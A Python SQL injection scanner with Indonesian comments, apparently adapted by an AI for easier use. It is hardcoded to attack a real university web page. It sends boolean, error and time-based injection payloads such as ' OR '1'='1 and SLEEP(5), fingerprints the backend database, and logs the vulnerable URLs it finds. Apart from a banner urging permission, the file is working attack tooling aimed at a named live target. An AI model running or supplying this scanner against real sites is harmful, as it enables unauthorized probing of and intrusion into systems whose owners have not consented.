#!/usr/bin/env python3
"""
inject.py

Enhanced SQL Injection Testing Framework v2.2

Author: ZnX Pentester (modifikasi otomatis oleh AI untuk penggunaan lebih sederhana)
"""

import asyncio
import json
import logging
import os
import sys
import re
import time
from typing import Any, Dict, List, Optional, Tuple, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx
from bs4 import BeautifulSoup

# ------------------------------------
# Konfigurasi Awal - Bisa diubah sesuai kebutuhan
# ------------------------------------
TARGETS = [
    "https://kb.ndsu.edu/it/page.php?id=98971",
    # Tambahkan URL target lainnya di sini jika diperlukan
]

PAYLOADS = {
    "boolean": ["' OR '1'='1", "' AND '1'='2"],
    "error": ["'"],
    "time": ["' AND SLEEP(5)-- ", "' || pg_sleep(5)--"]
}

CONCURRENCY = 5
TIMEOUT = 5
PROXY = None  # contoh: 'http://127.0.0.1:8080'
VERBOSE = True
SUMMARY = True

# Banner
BANNER = r"""
███████╗ ██████╗ ██╗     ██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║     ███████╗██║ ╚████║   ██║   ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                     SQL Injection Testing Framework
              Gunakan hanya pada sistem yang Anda miliki izin!
"""

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Fungsi bantu

def fingerprint_dbms(response: httpx.Response, elapsed: float, time_threshold: float = 3.0) -> str:
    text = response.text.lower()
    if any(x in text for x in ['mysql', 'you have an error in your sql syntax']):
        return 'mysql'
    if any(x in text for x in ['syntax error at or near', 'pg_sleep', 'pgsql']):
        return 'postgresql'
    if any(x in text for x in ['oracle', 'ora-']):
        return 'oracle'
    if any(x in text for x in ['microsoft sql', 'incorrect syntax near']):
        return 'mssql'
    if elapsed >= time_threshold:
        return 'unknown-time'
    return 'unknown'

def get_form_csrf(html: str) -> Tuple[Dict[str,str], str]:
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    token_data = {}
    action = form.get('action') if form else ''
    if form:
        for inp in form.find_all('input', {'type': 'hidden'}):
            name = inp.get('name')
            val = inp.get('value', '')
            token_data[name] = val
    return token_data, action

async def test_request(method: str, url: str, data: Optional[Dict[str,Any]],
                       headers: Dict[str,str], payloads: Dict[str,List[str]],
                       client: httpx.AsyncClient) -> Optional[Dict[str,Any]]:
    try:
        base_resp = await client.request(method, url, data=data, headers=headers)
        base_time = base_resp.elapsed.total_seconds()
        base_len = len(base_resp.text)
        csrf_tokens, _ = get_form_csrf(base_resp.text)

        for inj_type, plist in payloads.items():
            for p in plist:
                inj_url = url
                if '?' in url:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    param = list(qs.keys())[0]
                    qs[param] = qs[param][0] + p
                    inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                try:
                    r = await client.request(method, inj_url, data=data, headers=headers)
                    elapsed = r.elapsed.total_seconds()
                    dbms = fingerprint_dbms(r, elapsed)
                    if inj_type == 'boolean' and len(r.text) != base_len:
                        return {'url': inj_url, 'dbms': dbms, 'type': inj_type}
                    elif inj_type == 'time' and elapsed > base_time + 3:
                        return {'url': inj_url, 'dbms': dbms, 'type': inj_type}
                    elif inj_type == 'error' and dbms != 'unknown':
                        return {'url': inj_url, 'dbms': dbms, 'type': inj_type}
                except Exception as e:
                    continue
    except Exception as e:
        logger.error(f"Request gagal: {e}")
    return None

async def run_scan(targets: List[str], payloads: Dict[str,List[str]]) -> List[Dict[str,Any]]:
    semaphore = asyncio.Semaphore(CONCURRENCY)
    results = []
    async with httpx.AsyncClient(timeout=TIMEOUT, proxies=PROXY) as client:
        tasks = []
        for target in targets:
            async def sem_task(t=target):
                async with semaphore:
                    res = await test_request("GET", t, None, {}, payloads, client)
                    if res:
                        results.append(res)
            tasks.append(sem_task())
        await asyncio.gather(*tasks)
    return results

# Fungsi utama

def main():
    print(BANNER)
    logger.info(f"Menjalankan scan terhadap {len(TARGETS)} target...")
    results = asyncio.run(run_scan(TARGETS, PAYLOADS))
    if not results:
        logger.info("Tidak ditemukan hasil dari target.")
        return
    os.makedirs("results", exist_ok=True)
    summary_lines = []
    for r in results:
        host = urlparse(r['url']).hostname or 'unknown'
        out = [
            f"[+] URL: {r['url']}",
            f"[+] DBMS: {r['dbms']}",
            f"[+] Jenis Injeksi: {r['type']}"
        ]
        summary_lines.append("\n".join(out))
        with open(f"results/{host}.txt", 'w') as f:
            f.write("\n".join(out))
    if SUMMARY:
        with open("results/summary.txt", 'w') as f:
            f.write("\n\n".join(summary_lines))
        logger.info("Ringkasan ditulis di: results/summary.txt")

if __name__ == '__main__':
    main()
